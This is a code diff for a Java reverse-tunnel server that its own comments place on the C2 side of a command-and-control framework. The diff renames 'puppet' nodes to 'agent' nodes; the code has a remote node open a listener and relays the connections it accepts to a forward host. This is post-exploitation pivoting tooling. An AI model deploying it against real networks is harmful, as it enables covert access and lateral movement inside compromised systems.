@@ -1,7 +1,7 @@
 package org.leo.core.engine.reverse;
 
 import org.leo.core.engine.socks5.Socks5ProxyStatistics;
-import org.leo.core.puppet.capability.ComponentInvokeCapable;
+import org.leo.core.agent.capability.ComponentInvokeCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -23,8 +23,8 @@ import java.util.concurrent.atomic.AtomicInteger;
  * 反向隧道服务器（C2 侧）。
  *
  * 流程：
- *   1. 通过 invokeComponent 在 puppet 端开 ServerSocket 监听 remoteListenPort
- *   2. 启动 AcceptPollThread 周期性轮询 puppet 端的新连接
+ *   1. 通过 invokeComponent 在 agent 端开 ServerSocket 监听 remoteListenPort
+ *   2. 启动 AcceptPollThread 周期性轮询 agent 端的新连接
  *   3. 每个新连接由 dialerExecutor 异步在 C2 侧拨号到 forwardHost:forwardPort，
  *      并启动 ReverseReadThread / ReverseWriteThread 双向中继
  *
@@ -46,7 +46,7 @@ public class ReverseTunnelServer {
     private static final int  DEFAULT_MAX_CONNS        = 200;
     private static final int  DEFAULT_DIALER_THREADS   = 8;
 
-    private final ComponentInvokeCapable puppetNode;
+    private final ComponentInvokeCapable agentNode;
     private final String listenId;
     private final int remoteListenPort;
     private final String bindAddr;
@@ -68,33 +68,33 @@ public class ReverseTunnelServer {
             new ConcurrentHashMap<String, Socket>();
     private final Set<String> pendingConns = ConcurrentHashMap.newKeySet();
 
-    public ReverseTunnelServer(ComponentInvokeCapable puppetNode,
+    public ReverseTunnelServer(ComponentInvokeCapable agentNode,
                                 int remoteListenPort,
                                 String bindAddr,
                                 String forwardHost,
                                 int forwardPort) {
-        this(puppetNode, remoteListenPort, bindAddr, forwardHost, forwardPort,
+        this(agentNode, remoteListenPort, bindAddr, forwardHost, forwardPort,
                 DEFAULT_POLL_INTERVAL_MS, DEFAULT_MAX_CONNS);
     }
 
-    public ReverseTunnelServer(ComponentInvokeCapable puppetNode,
+    public ReverseTunnelServer(ComponentInvokeCapable agentNode,
                                 int remoteListenPort,
                                 String bindAddr,
                                 String forwardHost,
                                 int forwardPort,
                                 long pollIntervalMs) {
-        this(puppetNode, remoteListenPort, bindAddr, forwardHost, forwardPort,
+        this(agentNode, remoteListenPort, bindAddr, forwardHost, forwardPort,
                 pollIntervalMs, DEFAULT_MAX_CONNS);
     }
 
-    public ReverseTunnelServer(ComponentInvokeCapable puppetNode,
+    public ReverseTunnelServer(ComponentInvokeCapable agentNode,
                                 int remoteListenPort,
                                 String bindAddr,
                                 String forwardHost,
                                 int forwardPort,
                                 long pollIntervalMs,
                                 int maxConns) {
-        this.puppetNode = puppetNode;
+        this.agentNode = agentNode;
         this.remoteListenPort = remoteListenPort;
         this.bindAddr = (bindAddr == null || bindAddr.length() == 0) ? "127.0.0.1" : bindAddr;
         this.forwardHost = forwardHost;
@@ -102,7 +102,7 @@ public class ReverseTunnelServer {
         this.pollIntervalMs = pollIntervalMs > 0 ? pollIntervalMs : DEFAULT_POLL_INTERVAL_MS;
         this.maxConns = maxConns > 0 ? maxConns : DEFAULT_MAX_CONNS;
         this.listenId = UUID.randomUUID().toString().replace("-", "");
-        // 复用统计模型；port 字段填 puppet 侧监听端口
+        // 复用统计模型；port 字段填 agent 侧监听端口
         this.statistics = new Socks5ProxyStatistics(remoteListenPort);
     }
 
@@ -140,7 +140,7 @@ public class ReverseTunnelServer {
 
     /**
      * 注册"隧道死亡"回调。
-     * 当 AcceptPollLoop 检测到 puppet 端 listenId 不再存在（404）时触发，
+     * 当 AcceptPollLoop 检测到 agent 端 listenId 不再存在（404）时触发，
      * 由调用方（ComponentInvokeCapable）负责从 reverseTunnels map 中移除自身。
      */
     public void setOnDead(Runnable onDead) {
@@ -148,8 +148,8 @@ public class ReverseTunnelServer {
     }
 
     /**
-     * 启动反向隧道：先在 puppet 端开监听，成功后再启动轮询线程。
-     * 若后续初始化失败，主动 STOP_LISTEN 回滚，避免 puppet 端孤儿 ServerSocket。
+     * 启动反向隧道：先在 agent 端开监听，成功后再启动轮询线程。
+     * 若后续初始化失败，主动 STOP_LISTEN 回滚，避免 agent 端孤儿 ServerSocket。
      */
     public synchronized void start() throws Exception {
         if (running) {
@@ -159,10 +159,10 @@ public class ReverseTunnelServer {
         Map<String, Object> params = listenerParams(OP_START_LISTEN);
         params.put("listenPort", Integer.valueOf(remoteListenPort));
         params.put("bindAddr", bindAddr);
-        Map<String, Object> res = puppetNode.invokeComponent("ReverseTunnelComponent", params);
+        Map<String, Object> res = agentNode.invokeComponent("ReverseTunnelComponent", params);
         if (!hasResponseCode(res, 200)) {
             String msg = res != null ? String.valueOf(res.get("msg")) : "unknown";
-            throw new RuntimeException("puppet START_LISTEN failed: " + msg);
+            throw new RuntimeException("agent START_LISTEN failed: " + msg);
         }
 
         // START_LISTEN 已成功，后续初始化若失败必须回滚
@@ -193,7 +193,7 @@ public class ReverseTunnelServer {
             pollThread.setDaemon(true);
             pollThread.start();
         } catch (Exception e) {
-            // 回滚：让 puppet 端释放已绑定的端口
+            // 回滚：让 agent 端释放已绑定的端口
             running = false;
             cleanupLocalResources();
             try {
@@ -204,12 +204,12 @@ public class ReverseTunnelServer {
             throw e;
         }
 
-        logger.info("反向隧道启动: puppet:{}:{} -> {}:{} (listenId={})",
+        logger.info("反向隧道启动: agent:{}:{} -> {}:{} (listenId={})",
                 bindAddr, remoteListenPort, forwardHost, forwardPort, listenId);
     }
 
     /**
-     * 停止反向隧道：先停轮询，再关 puppet 监听，最后清理本地连接。
+     * 停止反向隧道：先停轮询，再关 agent 监听，最后清理本地连接。
      */
     public synchronized void stop() {
         boolean wasRunning = running;
@@ -260,8 +260,8 @@ public class ReverseTunnelServer {
         }
     }
 
-    ComponentInvokeCapable getPuppetNode() {
-        return puppetNode;
+    ComponentInvokeCapable getAgentNode() {
+        return agentNode;
     }
 
     ConcurrentHashMap<String, Socket> getLocalConns() {
@@ -322,7 +322,7 @@ public class ReverseTunnelServer {
             Map<String, Object> params = new HashMap<String, Object>();
             params.put("op", Integer.valueOf(OP_CLOSE));
             params.put("connId", connId);
-            puppetNode.invokeComponent("ReverseTunnelComponent", params);
+            agentNode.invokeComponent("ReverseTunnelComponent", params);
         } catch (Exception ignored) {}
     }
 
@@ -334,7 +334,7 @@ public class ReverseTunnelServer {
     }
 
     private void stopRemoteListener() throws Exception {
-        puppetNode.invokeComponent("ReverseTunnelComponent", listenerParams(OP_STOP_LISTEN));
+        agentNode.invokeComponent("ReverseTunnelComponent", listenerParams(OP_STOP_LISTEN));
     }
 
     private static boolean hasResponseCode(Map<String, Object> response, int expectedCode) {
@@ -380,7 +380,7 @@ public class ReverseTunnelServer {
     }
 
     private boolean pollOnce() throws Exception {
-        Map<String, Object> response = puppetNode.invokeComponent(
+        Map<String, Object> response = agentNode.invokeComponent(
                 "ReverseTunnelComponent", listenerParams(OP_ACCEPT));
         if (hasResponseCode(response, 200)) {
             scheduleAcceptedConnections(response.get("newConns"));
@@ -390,7 +390,7 @@ public class ReverseTunnelServer {
             return true;
         }
 
-        logger.warn("反向隧道 listenId 在 puppet 端不存在，停止轮询: listenId={}", listenId);
+        logger.warn("反向隧道 listenId 在 agent 端不存在，停止轮询: listenId={}", listenId);
         handleRemoteListenerGone();
         notifyDeadListener();
         return false;
